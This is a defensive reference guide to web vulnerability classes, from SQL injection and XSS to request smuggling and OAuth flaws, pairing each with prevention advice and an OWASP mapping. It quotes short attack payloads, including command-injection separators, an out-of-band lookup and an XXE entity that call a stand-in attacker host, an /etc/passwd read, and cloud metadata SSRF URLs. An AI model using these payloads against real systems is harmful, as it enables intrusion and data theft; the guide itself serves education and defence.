# Vulnerability Classes — Attack Patterns and Prevention

Comprehensive reference for web vulnerability classes, organized by attack surface. Each entry covers what it is, how attackers exploit it, detection signals, and prevention principles.

> Derived from PortSwigger Web Security Academy topics and real-world attack research.

---

## 1. Injection Attacks

### 1.1 SQL Injection (SQLi)

**What it is:** Attacker-controlled input is incorporated into SQL queries, allowing them to read, modify, or delete database contents, and sometimes execute OS commands.

**Attack variants:**
- **In-band (classic):** Results returned directly in the response. Includes UNION-based (appending extra SELECT via UNION) and error-based (extracting data from error messages).
- **Blind:** No visible output. Boolean-based (true/false differences in response) or time-based (conditional delays via `SLEEP()` / `pg_sleep()`).
- **Out-of-band:** Data exfiltrated via DNS or HTTP requests triggered from the database (e.g., `UTL_HTTP` in Oracle, `xp_dirtree` in MSSQL).
- **Second-order:** Malicious input stored safely, then incorporated unsafely into a later query.

**Injection points beyond WHERE clauses:**
- `INSERT` values, `UPDATE` values, `ORDER BY`, table/column names, `LIMIT`/`OFFSET`

**Detection signals:**
- String concatenation in query construction
- User input in `ORDER BY` or column selection
- Dynamic table or column names from request parameters

**Prevention:**
- Parameterized queries / prepared statements — always
- ORM usage with parameterized bindings
- Allowlist validation for column names, sort directions, table names
- Least-privilege database accounts
- Web Application Firewall as defense-in-depth (not primary defense)

### 1.2 NoSQL Injection

**What it is:** Injection into NoSQL databases (MongoDB, CouchDB, etc.) via operator injection or JavaScript injection.

**Attack patterns:**
- Operator injection: `{"username": {"$ne": ""}, "password": {"$ne": ""}}` — bypasses authentication
- JavaScript injection in `$where` clauses
- Regex injection for data extraction: `{"username": {"$regex": "^a"}}`

**Prevention:**
- Use database driver's built-in query builders — never construct queries from strings
- Validate and sanitize input types (reject objects when strings expected)
- Disable server-side JavaScript execution where possible

### 1.3 OS Command Injection

**What it is:** Attacker input is passed to a system shell, allowing execution of arbitrary OS commands.

**Attack patterns:**
- Command separators: `; | || & && \n`
- Command substitution: `` `command` `` or `$(command)`
- Blind detection via time delays: `; sleep 10`
- Out-of-band via DNS: `; nslookup attacker.com`

**Prevention:**
- Avoid calling OS commands from application code entirely
- If unavoidable, use parameterized APIs (not shell invocation)
- Allowlist validation of permitted characters
- Never pass user input directly to `exec()`, `system()`, `popen()`, or equivalent

### 1.4 Server-Side Template Injection (SSTI)

**What it is:** User input is embedded into server-side templates, allowing execution of arbitrary code on the server.

**Detection:** Submit template expressions and observe if they're evaluated:
- `{{7*7}}` → `49` (Jinja2, Twig)
- `${7*7}` → `49` (FreeMarker, Thymeleaf)
- `<%= 7*7 %>` → `49` (ERB)

**Prevention:**
- Never construct templates from user input
- Use logic-less templates where possible
- Sandbox template execution environments
- Validate and sanitize all input before template rendering

### 1.5 LDAP Injection

**What it is:** Manipulation of LDAP queries through unsanitized input, allowing authentication bypass or data extraction.

**Prevention:**
- Use parameterized LDAP queries
- Escape special LDAP characters: `( ) \ * / NUL`
- Validate input against expected patterns

---

## 2. Cross-Site Scripting (XSS)

### 2.1 Reflected XSS

**What it is:** Malicious script is reflected off the web server in the immediate response (e.g., in error messages, search results).

**Attack flow:** Attacker crafts a URL containing script → victim clicks → server reflects input → browser executes script in victim's session context.

**Contexts and payloads:**
- Between HTML tags: `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`
- In HTML attributes: `" onmouseover="alert(1)` (breaking out of attribute)
- In JavaScript strings: `'; alert(1); //` (breaking out of string)
- In JavaScript template literals: `${alert(1)}`
- In URLs: `javascript:alert(1)`

### 2.2 Stored XSS

**What it is:** Malicious script is permanently stored on the target server (in database, message forum, comment field, etc.) and served to other users.

**Higher impact than reflected:** Every user who views the stored content is affected — no need to trick them into clicking a link.

**Common locations:** User profiles, comments, forum posts, filenames, metadata fields.

### 2.3 DOM-based XSS

**What it is:** Vulnerability exists in client-side JavaScript that processes data from an untrusted source and writes it to a dangerous sink.

**Sources:** `location.hash`, `location.search`, `document.referrer`, `document.cookie`, `window.name`, `postMessage` data

**Dangerous sinks:** `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout()`, `setInterval()`, `Function()`, jQuery `$()`, `$.html()`

**Prevention (all XSS types):**
- Output encoding appropriate to context (HTML, attribute, JavaScript, URL, CSS)
- Input validation with allowlists
- Content Security Policy (CSP) as defense-in-depth
- Use safe DOM APIs: `textContent` instead of `innerHTML`, `createElement` instead of `document.write`
- HTTPOnly cookies to prevent session theft via XSS
- Framework auto-escaping (React JSX, Go `html/template`)

---

## 3. Authentication Vulnerabilities

**Attack patterns:**
- **Credential stuffing:** Automated testing of breached username/password pairs
- **Brute force:** Systematic password guessing, often with common password lists
- **Username enumeration:** Detecting valid usernames via differences in error messages, response times, or HTTP status codes
- **MFA bypass:** Skipping the second factor by force-browsing past the MFA page, or exploiting flawed verification logic
- **Password reset poisoning:** Manipulating the Host header to redirect password reset links to attacker-controlled domains
- **Remember-me token exploitation:** Predictable or insufficiently protected persistent login tokens
- **Session fixation:** Forcing a known session ID onto a victim

**Prevention:**
- Rate limiting and progressive delays on login attempts
- Generic error messages ("Invalid credentials" — never reveal which field is wrong)
- MFA with proper enforcement (verify MFA status on every authenticated request)
- Rotate session tokens on authentication state changes
- Check passwords against breached password databases
- Use constant-time comparison for all secret comparisons

---

## 4. Broken Access Control

### 4.1 Vertical Privilege Escalation

**What it is:** Accessing functionality reserved for higher-privilege roles.

**Attack patterns:**
- Direct URL access to admin pages (`/admin`, `/admin/deleteUser`)
- Parameter manipulation (`?admin=true`, `?role=1`)
- HTTP method override (`X-Original-URL`, `X-Rewrite-URL` headers)
- HTTP verb tampering (using GET instead of POST to bypass method-based controls)
- URL path discrepancies (trailing slash, case variation, file extension appending)

### 4.2 Horizontal Privilege Escalation

**What it is:** Accessing resources belonging to another user at the same privilege level.

**Attack patterns:**
- IDOR — changing `?id=123` to `?id=124`
- GUIDs may be leaked elsewhere in the application (user profiles, API responses)
- Redirect responses may still contain sensitive data in the body

### 4.3 Insecure Direct Object References (IDOR)

**What it is:** User-supplied input directly references internal objects (database records, files) without authorization checks.

**Variants:**
- Direct database object references (changing record IDs)
- Direct static file references (predictable file paths)

**Prevention (all access control):**
- Deny by default
- Enforce authorization on every request, not just navigation
- Use indirect references (map user-facing IDs to internal IDs server-side)
- Verify resource ownership: `WHERE id = ? AND owner_id = ?`
- Centralized access control mechanism — don't scatter checks across handlers
- Log and alert on access control failures

---

## 5. Server-Side Request Forgery (SSRF)

**What it is:** Attacker causes the server to make HTTP requests to an unintended location — typically internal services, cloud metadata endpoints, or other back-end systems.

**Attack patterns:**
- Accessing internal services: `http://localhost/admin`, `http://192.168.0.68/admin`
- Cloud metadata: `http://169.254.169.254/latest/meta-data/` (AWS), `http://metadata.google.internal/` (GCP)
- Bypassing blocklists: alternative IP representations (`2130706433`, `017700000001`, `127.1`), URL encoding, DNS rebinding
- Bypassing allowlists: URL parsing inconsistencies (`@`, `#`, DNS hierarchy tricks)
- Open redirect chaining: using an allowed URL that redirects to an internal target
- Blind SSRF: no response returned, but side effects observable (DNS lookups, timing)

**Hidden attack surface:**
- Partial URLs in request parameters
- URLs within data formats (XML/XXE, PDF generators, webhook URLs)
- Referer header processed by analytics

**Prevention:**
- Allowlist of permitted hosts/URLs — never blocklist
- Validate and sanitize all user-supplied URLs
- Disable unnecessary URL schemes (only allow `https://`)
- Don't rely on DNS resolution for validation (DNS rebinding)
- Network segmentation — application servers shouldn't reach internal services directly
- Use a dedicated egress proxy for outbound requests

---

## 6. Cross-Site Request Forgery (CSRF)

**What it is:** Attacker tricks a victim's browser into making an unwanted request to a site where the victim is authenticated, using the victim's cookies/session.

**Attack patterns:**
- Auto-submitting forms via `<form>` with `<script>` to submit
- Image tags triggering GET requests: `<img src="https://bank.com/transfer?to=attacker">`
- Exploiting CORS misconfigurations to make cross-origin requests with credentials

**When CSRF is possible:**
- State-changing action exists (transfer money, change email, change password)
- Cookie-based session handling (browser automatically attaches cookies)
- No unpredictable request parameters (no CSRF token)

**Prevention:**
- Anti-CSRF tokens (synchronizer token pattern) — unique per session, validated server-side
- SameSite cookie attribute (`Lax` or `Strict`)
- Verify Origin/Referer headers
- Require re-authentication for sensitive operations
- Use non-safe HTTP methods (POST/PUT/DELETE) for state changes

---

## 7. File Upload Vulnerabilities

**Attack patterns:**
- Uploading web shells (`.php`, `.jsp`, `.aspx`) for remote code execution
- Bypassing content-type validation (changing Content-Type header, using double extensions like `.php.jpg`)
- Bypassing extension blocklists (case variation, null bytes, alternative extensions)
- Path traversal in filenames to write files outside upload directory
- Polyglot files (valid image that is also valid PHP/JS)
- Zip slip — malicious archive with path traversal in entry names
- Pixel flood — images with extreme dimensions causing memory exhaustion
- SVG with embedded JavaScript

**Prevention:**
- Validate file type by magic bytes (content sniffing), not just extension or Content-Type header
- Allowlist of permitted file types — reject everything else
- Generate random filenames server-side — never use user-supplied filenames
- Store uploads outside the web root or in object storage
- Set Content-Disposition: attachment for downloads
- Enforce file size limits
- Strip metadata from uploaded files
- Scan uploads with antivirus
- Serve user content from a separate domain (isolation)

---

## 8. Race Conditions

**What it is:** Concurrent requests exploit time-of-check-to-time-of-use (TOCTOU) gaps, causing the application to enter unintended states.

**Attack patterns:**
- **Limit overrun:** Redeeming a discount code, gift card, or vote multiple times by sending parallel requests during the window between "check if used" and "mark as used"
- **Multi-endpoint races:** Adding items to cart after payment validation but before order confirmation
- **Single-endpoint races:** Parallel password resets for different users sharing session state — token goes to attacker, but reset applies to victim
- **Partial construction:** Exploiting the window between object creation and initialization (e.g., user exists but API key is null)
- **Time-sensitive attacks:** Predictable tokens based on timestamps — parallel requests generate identical tokens

**Detection methodology (PortSwigger):**
1. **Predict** potential collisions — identify security-critical endpoints that modify shared state
2. **Probe** for clues — send parallel requests (single-packet attack for HTTP/2) and compare responses to sequential baseline
3. **Prove** the concept — remove superfluous requests, confirm reproducibility

**Prevention:**
- Use database transactions with appropriate isolation levels
- Atomic check-and-update operations (e.g., `UPDATE ... WHERE ... RETURNING`)
- Database-level constraints (unique indexes, check constraints)
- Pessimistic locking (`SELECT ... FOR UPDATE`) for critical sections
- Avoid mixing data from different storage layers in security checks
- Use idempotency keys for operations that must not be repeated

---

## 9. Server-Side Vulnerabilities

### 9.1 Path Traversal

**What it is:** Accessing files outside the intended directory by manipulating file path parameters.

**Attack patterns:** `../../../etc/passwd`, URL-encoded variants (`%2e%2e%2f`), double encoding, null byte injection (legacy), nested traversal (`....//`)

**Prevention:**
- Resolve the canonical path and verify it starts with the expected base directory
- Use a filesystem sandbox or chroot
- Never construct file paths from user input

### 9.2 XXE (XML External Entity) Injection

**What it is:** Exploiting XML parsers that process external entity declarations, enabling file reading, SSRF, or denial of service.

**Attack patterns:**
- File retrieval: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
- SSRF: `<!ENTITY xxe SYSTEM "http://internal-server/">`
- Blind XXE via out-of-band: `<!ENTITY xxe SYSTEM "http://attacker.com/?data=...">`
- Billion laughs DoS: nested entity expansion

**Prevention:**
- Disable external entity processing and DTD processing in XML parsers
- Use JSON instead of XML where possible
- Validate and sanitize XML input

### 9.3 Insecure Deserialization

**What it is:** Untrusted data is deserialized, allowing attackers to manipulate application logic or achieve remote code execution.

**Attack patterns:**
- Modifying serialized object attributes (changing `isAdmin` from false to true)
- Gadget chains — chaining existing class methods to achieve code execution
- Type confusion attacks

**Prevention:**
- Never deserialize untrusted data
- Use format-specific serialization (JSON) instead of language-native serialization
- Implement integrity checks (HMAC, digital signatures) on serialized data
- Enforce strict type constraints during deserialization
- Isolate deserialization in low-privilege environments

### 9.4 Business Logic Flaws

**What it is:** Flaws in the application's business rules that allow attackers to abuse legitimate functionality.

**Examples:**
- Excessive trust in client-side controls (price manipulation)
- Failing to handle unconventional input (negative quantities, extreme values)
- Skipping steps in multi-step workflows
- Inconsistent security controls across different access paths
- Domain-specific flaws (e.g., applying discounts to already-discounted items)

**Prevention:**
- Document all business rules and assumptions
- Validate business logic server-side — never trust client-side enforcement
- Test edge cases: negative values, zero, maximum values, empty strings, unexpected types
- Enforce sequential workflow steps server-side

---

## 10. Client-Side Vulnerabilities

### 10.1 Clickjacking

**What it is:** Tricking users into clicking on something different from what they perceive, by overlaying transparent frames.

**Prevention:**
- `Content-Security-Policy: frame-ancestors 'none'` (or specific origins)
- `X-Frame-Options: DENY` (legacy fallback)

### 10.2 DOM-Based Vulnerabilities

**Beyond XSS — other DOM-based attacks:**
- Open redirect via `location.href = userInput`
- Cookie manipulation via `document.cookie = userInput`
- DOM clobbering — overriding global variables via HTML elements with `id` or `name` attributes

**Prevention:**
- Validate all data from DOM sources before use
- Use safe APIs (`textContent`, `setAttribute` with validated values)
- Avoid global variable declarations that could be clobbered

### 10.3 WebSocket Vulnerabilities

**Attack patterns:**
- Cross-site WebSocket hijacking (CSWSH) — WebSocket handshake relies only on cookies
- Message injection — manipulating WebSocket messages
- Missing origin validation on handshake

**Prevention:**
- Validate Origin header during WebSocket handshake
- Use authentication tokens in WebSocket messages (not just cookies)
- Validate and sanitize all WebSocket message content

### 10.4 Prototype Pollution

**What it is:** Injecting properties into JavaScript object prototypes, affecting all objects in the application.

**Attack patterns:**
- Client-side: polluting `Object.prototype` via `__proto__`, `constructor.prototype`
- Server-side: polluting prototypes in Node.js applications
- Gadget exploitation: finding application code that reads from polluted properties

**Prevention:**
- Use `Object.create(null)` for dictionary-like objects
- Freeze prototypes: `Object.freeze(Object.prototype)`
- Validate and sanitize recursive merge/clone operations
- Use `Map` instead of plain objects for key-value storage

---

## 11. Advanced / Emerging

### 11.1 HTTP Request Smuggling

**What it is:** Exploiting discrepancies in how front-end and back-end servers determine request boundaries, allowing an attacker to "smuggle" a request inside another.

**Variants:** CL.TE, TE.CL, TE.TE (obfuscating Transfer-Encoding)

**Impact:** Bypass security controls, poison web caches, hijack other users' requests, deliver reflected XSS without user interaction.

**Prevention:**
- Use HTTP/2 end-to-end (eliminates ambiguity)
- Normalize request parsing across all layers
- Reject ambiguous requests (both Content-Length and Transfer-Encoding)

### 11.2 Web Cache Poisoning

**What it is:** Manipulating cache keys and unkeyed inputs to store malicious responses in web caches, serving them to other users.

**Prevention:**
- Understand what your cache keys include
- Don't cache responses that vary on unkeyed headers
- Validate and sanitize all inputs, even those not in the cache key

### 11.3 JWT Attacks

**Attack patterns:**
- Algorithm confusion: changing `alg` to `none` (unsigned) or `HS256` (using public key as HMAC secret)
- Weak signing secrets (brute-forceable)
- JWK/JKU header injection — pointing to attacker-controlled key
- `kid` parameter injection (path traversal, SQL injection)

**Prevention:**
- Enforce expected algorithm server-side — never read `alg` from token
- Use strong, unique signing secrets
- Validate all claims (`iss`, `aud`, `exp`, `nbf`)
- Use established JWT libraries — don't implement JWT handling manually

### 11.4 OAuth Vulnerabilities

**Attack patterns:**
- Missing or weak state parameter — CSRF against OAuth flow
- Redirect URI manipulation — stealing authorization codes
- Scope upgrade — requesting more permissions than granted
- Implicit flow token leakage via Referer header
- PKCE bypass or downgrade

**Prevention:**
- Always validate state parameter
- Strict redirect URI validation (exact match, no wildcards)
- Use authorization code flow with PKCE (not implicit flow)
- Validate tokens server-side
- Verify token audience and issuer

### 11.5 API-Specific Vulnerabilities

**Attack patterns:**
- Mass assignment — setting fields the API didn't intend to expose (e.g., `isAdmin`, `role`)
- Excessive data exposure — API returns more data than the client needs
- Broken function-level authorization — admin endpoints accessible to regular users
- Lack of rate limiting on API endpoints
- GraphQL: introspection disclosure, nested query DoS, batch query abuse

**Prevention:**
- Explicit allowlist of assignable fields (never bind request body directly to model)
- Return only the fields the client needs
- Consistent authorization checks on all endpoints
- Rate limiting per user/API key
- GraphQL: disable introspection in production, enforce query depth/cost limits

---

## Quick Reference: Vulnerability → OWASP Top 10 Mapping

| Vulnerability Class | OWASP 2025 |
|---|---|
| SQL/NoSQL/Command/LDAP Injection | A05 |
| XSS (Reflected, Stored, DOM) | A05 |
| SSTI | A05 |
| Broken Access Control / IDOR | A01 |
| Authentication Flaws | A07 |
| CSRF | A01 |
| SSRF | A05 / A02 |
| File Upload | A01 / A05 |
| Race Conditions | A06 |
| Path Traversal | A01 |
| XXE | A05 |
| Insecure Deserialization | A08 |
| Business Logic Flaws | A06 |
| Security Misconfiguration | A02 |
| Cryptographic Failures | A04 |
| JWT/OAuth Attacks | A07 / A04 |
| HTTP Request Smuggling | A02 |
| Prototype Pollution | A08 |
| Clickjacking | A01 |
